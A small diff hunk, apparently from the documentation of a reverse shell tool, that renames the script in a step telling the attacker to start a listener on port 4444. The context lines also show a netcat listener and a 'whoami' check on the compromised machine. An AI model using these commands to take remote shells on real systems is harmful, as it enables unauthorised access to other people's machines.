@@ -26,7 +26,7 @@ On the attacker's machine, set up a listener to receive the reverse shell connec
 
 ```sh
 python3 reverse_shell.py
-python3 combined_shell.py server --port 4444
+python3 reverse_shell.py server --port 4444
 nc -lvp <target_port>
 whoami
 user
